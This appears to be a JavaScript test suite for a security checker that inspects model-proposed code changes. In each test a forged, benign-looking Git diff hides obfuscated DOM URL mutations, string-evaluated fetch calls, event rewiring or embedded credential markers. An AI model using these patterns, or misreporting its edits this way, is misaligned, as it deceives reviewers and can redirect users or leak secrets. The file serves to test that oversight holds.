test('independent Security rejects DOM URL mutations despite forged Git diff', () => {
  const original = 'const view = (<a>Old status copy</a>);\n';
  const attacks = [
    "<a onClick={(event) => event.currentTarget.setAttribute(\"href\", targetUrl)}>Open</a>",
    "<a onClick={(event) => event.currentTarget.setAttributeNS(null, \"href\", targetUrl)}>Open</a>",
    "<a onClick={(event) => { event.currentTarget.href = targetUrl; }}>Open</a>",
    "<a onClick={(event) => { event.currentTarget[\"href\"] = targetUrl; }}>Open</a>",
    "<a onClick={(event) => Object.assign(event.currentTarget, { href: targetUrl })}>Open</a>",
    "<a onClick={(event) => Reflect.set(event.currentTarget, \"href\", targetUrl)}>Open</a>",
    "<a onClick={(event) => event.currentTarget.toggleAttribute(\"ping\")}>Open</a>"
  ];
  for (const replace of attacks) {
    const actual = original.replace('<a>Old status copy</a>', replace);
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const unrelated = "safe";', // deliberately forged diff hides the mutation
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', replace);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), replace);
  }
  const safeActual = original.replace('Old status copy', 'New status copy');
  assert.equal(inspectModelDiff({
    original, actual: safeActual, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<a>New status copy</a>);',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safeActual) }
  }).status, 'passed');
});

test('independent Security rejects computed property effects with forged Git diff', () => {
  const original = 'const status = "Old status copy";\n';
  const candidates = [
    "const status = () => element['set' + 'Attribute']('href', targetUrl);",
    "const status = () => element['setAttribute']('href', targetUrl);",
    "const status = () => element[method]?.('href', targetUrl);",
    "const status = () => { element[key] = targetUrl; };",
    "const status = () => { element['h' + 'ref'] = targetUrl; };"
  ];
  for (const code of candidates) {
    const actual = code + '\n';
    const result = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "Nothing unsafe here";', // intentionally forged
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(result.status, 'failed', code);
    assert.ok(result.findings.includes('Potentially unsafe new code'), code);
  }
  const safe = 'const status = items[index] + "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = items[index] + "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});


test('independent Security rejects computed indirect calls even with a forged harmless diff', () => {
  const original = 'const status = "Old status copy";\n';
  const attacks = [
    'const status = () => element[method].call(element, "href", targetUrl);',
    'const status = () => element[method]?.apply(element, args);',
    'const status = () => element[method].bind(element)("href", targetUrl);',
    'const status = () => element[method]?.call?.(element, "href", targetUrl);',
    'const status = () => element[method].apply?.(element, args);'
  ];
  for (const code of attacks) {
    const actual = code + '\n';
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "New status copy";', // intentionally excludes the real added method call
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', code);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), code);
  }
  const safe = 'const status = items[index] + "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = items[index] + "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects quoted bracket indirect calls with forged harmless diff', () => {
  const original = 'const status = "Old status copy";\n';
  const attacks = [
    'const status = () => element[method]["call"](element, "href", targetUrl);',
    'const status = () => element[method]?.["apply"](element, args);',
    'const status = () => element[method][`bind`](element)("href", targetUrl);',
    'const status = () => element[method]["apply"]?.(element, args);',
    'const status = () => element[method]?.["call"]?.(element, "href", targetUrl);'
  ];
  for (const code of attacks) {
    const actual = code + '\n';
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "New status copy";', // deliberately conceals the real executable addition
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', code);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), code);
  }
  const safe = 'const status = items[index]["label"] + "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = items[index]["label"] + "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects computed-to-named method chains despite forged harmless diff', () => {
  const original = 'const status = "Old status copy";\n';
  const attacks = [
    'const status = () => element[method].trigger(targetUrl);',
    'const status = () => element[method]?.invoke(targetUrl);',
    'const status = () => element[method].handler?.(targetUrl);',
    'const status = () => element[method].handler.call(element, targetUrl);',
    'const status = () => element[method]?.nested?.execute?.(targetUrl);'
  ];
  for (const code of attacks) {
    const actual = code + '\n';
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "New status copy";', // deliberately hides executable candidate
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', code);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), code);
  }
  const safe = 'const status = items[index].label + "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = items[index].label + "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});


test('independent Security rejects parenthesized computed calls even with forged benign diff', () => {
  const original = 'const status = "Old status copy";\n';
  const attacks = [
    'const status = () => (element[method]).trigger(targetUrl);',
    'const status = () => ((element[method])).trigger(targetUrl);',
    'const status = () => (element[method].handler)?.(targetUrl);',
    'const status = () => (element[method])["trigger"](targetUrl);',
    'const status = () => ((element[method])[handler]).call(element, targetUrl);',
    'const status = () => (element[method])?.trigger?.(targetUrl);'
  ];
  for (const code of attacks) {
    const actual = code + '\n';
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "New status copy";', // deliberately forged benign diff
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', code);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), code);
  }
  const safe = 'const status = ((items[index])).label + "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = ((items[index])).label + "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security denies timer-based string execution with a forged clean diff', () => {
  const original = 'const status = "Old status copy";\n';
  const attacks = [
    "const status = () => setTimeout(\"fe\" + \"tch(targetUrl)\", 0);",
    "const status = () => setInterval(\"lo\" + \"cation=targetUrl\", 1000);",
    "const status = () => (setTimeout).call(null, \"fe\" + \"tch(targetUrl)\", 0);",
    "const status = () => setTimeout?.(\"fe\" + \"tch(targetUrl)\", 0);",
    "const status = () => { const callback = setInterval; return callback(\"fe\" + \"tch(targetUrl)\", 0); };"
  ];
  for (const code of attacks) {
    const actual = code + '\n';
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "New status copy";', // forged to conceal actual timer code
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', code);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), code);
  }
  const safe = 'const status = "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});


test('independent Security rejects aliased DOM mutators even with forged safe diff', () => {
  const original = 'const status = "Old status copy";\n';
  const attacks = [
    'const status = () => { const setter = element.setAttribute; return setter.call(element, "href", targetUrl); };',
    'const status = () => { const { setAttribute: write } = element; return write.call(element, "href", targetUrl); };',
    'const status = () => { const toggle = element.toggleAttribute; return toggle.call(element, "ping"); };',
    'const status = () => element.removeAttribute("sandbox");',
    'const status = () => { const setter = element.setAttributeNodeNS; return setter.call(element, null, attr); };',
    'const status = () => { const remove = element.removeAttributeNode; return remove.call(element, attr); };'
  ];
  for (const code of attacks) {
    const actual = code + '\n';
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "New status copy";', // forged, never shows the real alias
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', code);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), code);
  }
  const safe = 'const status = "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});


test('independent Security blocks native mutation aliases despite forged harmless diff', () => {
  const original = 'const status = "Old status copy";\n';
  const attacks = [
    'const status = () => { const put = Object["assign"]; return put(anchor, { href: targetUrl }); };',
    'const status = () => { const { assign: put } = Object; return put(anchor, { href: targetUrl }); };',
    'const status = () => { const put = (Object)["assign"]; return put(anchor, { href: targetUrl }); };',
    'const status = () => { const ref = Object; return ref["assign"](anchor, { href: targetUrl }); };',
    'const status = () => { const write = Reflect["set"]; return write(anchor, "href", targetUrl); };',
    'const status = () => { const { set: write } = Reflect; return write(anchor, "href", targetUrl); };'
  ];
  for (const attack of attacks) {
    const actual = attack + '\n';
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "New status copy";', // intentionally forged clean diff
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', attack);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), attack);
  }
  const safe = 'const status = "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});


test('independent Security rejects attribute-node changes even with forged harmless Git diff', () => {
  const original = 'const status = "Old status copy";\n';
  const attacks = [
    'const status = () => { anchor.attributes[0].value = targetUrl; };',
    'const status = () => { anchor.getAttributeNode("href").value = targetUrl; };',
    'const status = () => { anchor["attributes"].item(0).nodeValue = targetUrl; };',
    'const status = () => { const { attributes: attrs } = anchor; attrs[0].value = targetUrl; };',
    'const status = () => { const attr = anchor.getAttributeNodeNS(null, "href"); attr.value = targetUrl; };',
    'const status = () => { const node = anchor.attributes.getNamedItem("href"); node.value = targetUrl; };'
  ];
  for (const attack of attacks) {
    const actual = attack + '\n';
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "New status copy";', // deliberately forged clean diff
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', attack);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), attack);
  }
  const safe = 'const status = "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});


test('independent Security rejects event-wiring mutations despite forged benign diff', () => {
  const original = 'const status = "Old status copy";\n';
  const attacks = [
    "const status = <button onClick={existingAction}>New status</button>;",
    "const status = <img onError={existingAction} />;",
    "const status = () => { button.onclick = existingAction; };",
    "const status = () => { button.addEventListener(\"click\", existingAction); };",
    "const status = () => { button.dispatchEvent(new Event(\"click\")); };",
    "const status = () => { const { onClick: existing } = buttonProps; existing(); };",
    "const status = () => { button.onmouseover = existingAction; };"
];
  for (const attack of attacks) {
    const actual = attack + '\n';
    const verdict = inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const status = "New status copy";', // deliberately forged
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
    assert.equal(verdict.status, 'failed', attack);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), attack);
  }
  const safe = 'const status = "New status copy";\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const status = "New status copy";',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security blocks JSX prop-order change despite forged benign diff', () => {
  const original = 'const view = (<div onClick={safeAction} {...overrideProps}>Old copy</div>);\n';
  const actual = original.replace(
    'onClick={safeAction} {...overrideProps}',
    '{...overrideProps} onClick={safeAction}'
  );
  const verdict = inspectModelDiff({
    original, actual, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const label = "New copy";', // forged to conceal a real callback precedence change
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
  });
  assert.equal(verdict.status, 'failed');
  assert.ok(verdict.findings.includes('Potentially unsafe new code'));

  const safe = original.replace('Old copy', 'New copy');
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<div onClick={safeAction} {...overrideProps}>New copy</div>);',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects swapped JSX action tag order despite forged harmless diff', () => {
  const first = '<button onClick={approve}>Approve</button>';
  const second = '<button onClick={reject}>Reject</button>';
  const original = 'const view = (<>' + first + second + '</>);' + String.fromCharCode(10);
  const actual = original.replace(first + second, second + first);
  const verdict = inspectModelDiff({
    original, actual, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const label = "Updated safe copy";', // forged diff hides actual tag reorder
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
  });
  assert.equal(verdict.status, 'failed');
  assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  const safe = original.replace('Approve</button>', 'Confirm</button>');
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<button onClick={approve}>Confirm</button>);',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security catches JSX closing-boundary reparenting despite forged diff', () => {
  const original = 'const view = (<div onClick={first}>First</div><div onClick={second}>Second</div>);\n';
  const actual = original.replace('First</div><div onClick={second}>Second',
    'First<div onClick={second}>Second</div>');
  const verdict = inspectModelDiff({
    original, actual, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const uiLabel = "Updated copy";', // intentionally hides the actual reparenting
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
  });
  assert.equal(verdict.status, 'failed');
  assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  const safe = original.replace('First</div>', 'Updated first</div>');
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const view = (<div onClick={first}>Updated first</div>);',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects private-key markers in actual source despite forged diff', () => {
  for (const label of ['DSA PRIVATE KEY', 'X25519 PRIVATE KEY', 'PRIVATE KEY']) {
    const marker = '-----BEGIN ' + label + '-----';
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(inspectModelDiff(input).status, 'passed', 'safe candidate remains eligible');
});

test('independent Security refuses quoted config secrets despite forged clean diff', () => {
  const markers = [
    '{"client_secret":"synthetic-long-secret-value-123"}',
    '{"password":"synthetic-long-password-123"}',
    "{'aws_secret_access_key': 'synthetic-long-value-123'}",
    '{"accountkey": "synthetic-long-value-123"}',
    '{"service_role":"synthetic-long-value-123"}',
    '{"api-key":"synthetic-long-value-123"}'
  ];
  for (const marker of markers) {
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n', // deliberately omit secret
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', marker);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), marker);
  }
  const safe = 'const items = 2; // {"copy":"Public labels only"}\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const items = 2; // {"copy":"Public labels only"}',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects camelCase secret fields in actual candidate despite forged diff', () => {
  const markers = [
    '{"clientSecret":"synthetic-long-secret-value-123"}',
    "clientSecret = 'synthetic-long-secret-value-123'",
    '{"awsSecretAccessKey":"synthetic-long-secret-value-123"}',
    "awsSecretAccessKey: 'synthetic-long-secret-value-123'",
    '{"serviceRole":"synthetic-long-secret-value-123"}',
    '{"accountKey":"synthetic-long-secret-value-123"}',
    '{"client-secret":"synthetic-long-secret-value-123"}'
  ];
  for (const marker of markers) {
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n', // forged clean diff
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', marker);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), marker);
  }
  const safe = 'const items = 2; // {"clientStatus":"Public label only"}\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const items = 2; // {"clientStatus":"Public label only"}',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('Security independently rejects private/signing key assignments from actual bytes despite forged diff', () => {
  const markers = [
    '{"privateKey":"synthetic-private-key-value-123"}',
    "private_key = 'synthetic-private-key-value-123'",
    '{"signingKey":"synthetic-signing-key-value-123"}',
    '{"secret_key":"synthetic-secret-key-value-123"}',
    '{"encryption-key":"synthetic-encryption-key-value-123"}',
    '{"webhookSecret":"synthetic-webhook-secret-value-123"}'
  ];
  for (const marker of markers) {
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', marker);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), marker);
  }
  const safe = 'const items = 2; // {"publicKey":"Visible public copy label"}\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const items = 2; // {"publicKey":"Visible public copy label"}',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security blocks encoded credential names in actual candidate despite forged diff', () => {
  const slash = String.fromCharCode(92);
  const markers = [
    '{"cl' + slash + 'u0069entSecret":"synthetic-long-credential-123"}',
    "{'private" + slash + "u004Bey':'synthetic-long-credential-123'}",
    'api' + slash + 'x4Bey = "synthetic-long-credential-123"'
  ];
  for (const marker of markers) {
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', 'actual bytes must override misleading Git diff');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(inspectModelDiff(input).status, 'passed', 'safe fixture remains eligible');
});

test('Security independently rejects dotted credential assignments in actual candidate despite forged Git diff', () => {
  const markers = [
    '{"client.secret":"synthetic-long-credential-123"}',
    "api.key = 'synthetic-long-credential-123'",
    'aws.secret.access.key: syntheticlongcredential123',
    '{"refresh.token":"synthetic-long-credential-123"}',
    'db.password = "synthetic-long-credential-123"'
  ];
  for (const marker of markers) {
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      // Diff is deliberately clean but inconsistent with actual candidate.
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', 'Security inspects actual candidate bytes');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const safe = 'const items = 2; // {"public.key":"Visible copy only"}\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const items = 2; // {"public.key":"Visible copy only"}',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed', 'ordinary public display copy stays allowed');
});


test('independent Security rejects template-valued credential fields even with forged clean diff', () => {
  const tick = String.fromCharCode(96);
  const markers = [
    'password = ' + tick + 'x' + tick,
    'clientSecret: ' + tick + 'short' + tick,
    'accessToken: ' + tick + 'abc' + tick,
    'db.password: ' + tick + 'x' + tick,
    'privateKey: ' + tick + '$' + '{synthetic}' + tick,
    'secretKey: ' + tick + 'line 1\nline 2' + tick
  ];
  for (const marker of markers) {
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', 'actual candidate bytes override forged diff');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const safe = 'const items = 2; // publicLabel: ' + tick + 'Safe public copy' + tick + '\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const items = 2; // publicLabel: ' + tick + 'Safe public copy' + tick,
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects expression-valued secrets despite a forged harmless Git diff', () => {
  const markers = [
    'password: (readFixture())',
    'clientSecret /* artificial */ = (constructFixture())',
    '"api.key": ({ fixture: true })',
    'accessToken: [fixtureValue]',
    'privateKey = () => "dummy"',
    'db.password /* explanatory */ : { fixture: true }'
  ];
  for (const marker of markers) {
    const base = 'const label = "Old copy";\n';
    const changed = base.replace('Old copy', 'Old copy"; // ' + marker);
    const verdict = inspectModelDiff({
      original: base,
      actual: changed,
      changedPaths: [MODEL_ALLOWED_PATH],
      diff: '+const label = "Harmless copy";', // deliberately hides the actual secret field
      report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(changed) }
    });
    assert.equal(verdict.status, 'failed', marker);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), marker);
  }
  const base = 'const label = "Old copy";\n';
  const changed = base.replace('Old copy', 'نص عربي آمن');
  const safe = inspectModelDiff({
    original: base, actual: changed, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const label = "نص عربي آمن";',
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(changed) }
  });
  assert.equal(safe.status, 'passed', 'safe text must not be rejected');
});
